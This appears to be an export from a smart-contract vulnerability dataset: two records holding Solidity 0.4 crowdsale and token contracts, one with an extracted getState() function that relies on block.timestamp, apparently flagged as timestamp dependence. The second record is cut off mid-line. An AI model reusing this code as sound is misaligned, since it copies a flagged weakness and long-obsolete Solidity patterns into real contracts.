[{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eaf"
  },
  "filename": "10022.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb0"
  },
  "filename": "10023.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = 